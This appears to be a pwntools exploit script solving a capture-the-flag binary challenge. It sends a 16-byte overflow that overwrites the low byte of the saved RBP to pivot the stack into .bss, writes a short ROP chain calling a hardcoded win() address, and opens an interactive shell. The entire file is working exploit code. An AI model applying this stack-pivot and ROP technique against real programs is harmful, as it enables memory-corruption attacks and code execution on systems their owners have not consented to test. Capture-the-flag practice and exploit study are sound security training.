from pwn import *

# Set up binary and ROP
elf = context.binary = ELF('./chall')
rop = ROP(elf)

# Constants
win_addr = 0x401256 #elf.sym['win']
bss_addr = 0x404060 # elf.bss() + 0x100  # Safe .bss area
print("Win adr:", win_addr)
print("Bss: ", bss_addr)

# Start process
p = process('./chall')

# 1. Overflow to pivot stack
payload = flat({
    0: b'A'*16,          # Fill buffer
    16: p8(0x40)         # Overwrite RBP LSB (adjust to match .bss)
})

# 2. ROP chain in .bss
rop_chain = flat([
    rop.ret.address,     # Stack alignment
    win_addr             # Call win()
])

# Send payloads
p.sendlineafter(b"0-9.\n", b"17")  # Max allowed input
p.send(payload)                    # Trigger overflow
p.send(rop_chain.ljust(0x100, b'\x00'))  # Write to .bss

# Get shell!
p.interactive()